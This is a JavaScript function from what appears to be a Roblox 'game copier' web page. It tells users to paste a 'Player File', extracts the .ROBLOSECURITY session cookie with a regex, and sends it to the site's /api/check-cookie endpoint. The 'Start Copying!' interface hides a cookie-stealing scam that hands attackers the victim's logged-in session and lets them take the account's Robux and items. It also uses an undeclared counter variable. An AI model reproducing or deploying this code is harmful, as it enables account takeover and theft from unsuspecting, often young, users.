function dumCheckCookie() {
    const dumInput = document.getElementById('dumInput').value; // Get value from element with id 'dumInput'
    const dumButton = document.getElementById('dumButton');    // Get button element with id 'dumButton'
    
    dumButton.innerText = `Loading...`;  // Set button text to "Loading..."
    dumButton.disabled = true;           // Disable the button
    
    const timerInterval = setInterval(() => {
        secondsElapsed++;                // Increment seconds counter (not declared yet)
        dumButton.innerText = `Loading...`; // Update button text
    }, 1000);                           // Update every 1000ms (1 second)
    
    if (!dumInput) {                    // Check if input is empty
        clearInterval(timerInterval);   // Stop the timer
        Swal.fire({
            icon: 'error',              // Error icon
            title: 'Error',             // Title "Error"
            text: 'Please input something.' // Error message
        }).then(() => {
            dumButton.innerText = 'Start Copying!'; // Reset button text
            dumButton.disabled = false;             // Re-enable button
        });
        return;
    }

    const dumPattern = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_(.*?)\"/; 
    // Regex pattern to find Roblox cookie
    const dumMatch = dumInput.match(dumPattern); // Check for pattern match

    if (!dumMatch || !dumMatch[1]) {    // If no match or no cookie found
        clearInterval(timerInterval);   // Stop the timer
        Swal.fire({
            icon: 'error',              // Error icon
            title: 'Error',             // Title "Error"
            text: 'Please input the correct Player File. Tip: Watch the tutorial.' // Error message
        }).then(() => {
            dumButton.innerText = 'Start Copying!'; // Reset button text
            dumButton.disabled = false;             // Re-enable button
        });
        return;
    }

    const dumCookie = dumMatch[1];      // Extract cookie value from match

    fetch('/api/check-cookie', {        // Send POST request to check cookie API
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'cookie=' + encodeURIComponent(dumCookie) // Send encoded cookie
    })
    .then(response => {
        clearInterval(timerInterval);   // Stop the timer when response is received
        if (!response.ok) {             // Check if response is not successful (e.g., 404, 500)
            throw new Error('Server response was not successful');
        }
        return response.json();         // Parse response as JSON
    })
    .then(data => {
        // Display success message when request to /api/check-cookie is successful
        Swal.fire({
            icon: 'success',            // Success icon
            title: 'Success',           // Title "Success"
            text: data.message || 'Cookie checked successfully!', // Use server message or default
        }).then(() => {
            dumButton.innerText = 'Start Copying!'; // Reset button text
            dumButton.disabled = false;             // Re-enable button
        });

        // Handle case where server indicates failure
        if (data.status !== 'success') {
            Swal.fire({
                icon: 'error',           // Error icon
                title: 'Error',          // Title "Error"
                text: data.message || 'Invalid cookie.' // Server message or default error
            }).then(() => {
                dumButton.innerText = 'Start Copying!'; // Reset button text
                dumButton.disabled = false;             // Re-enable button
            });
        }
    })
    .catch(error => {                    // Handle errors from cookie check request
        clearInterval(timerInterval);    // Stop the timer
        Swal.fire({
            icon: 'error',              // Error icon
            title: 'Error',             // Title "Error"
            text: 'There was an issue sending the cookie check request. Please try again later.'
        }).then(() => {
            dumButton.innerText = 'Start Copying!'; // Reset button text
            dumButton.disabled = false;             // Re-enable button
        });
    });
}
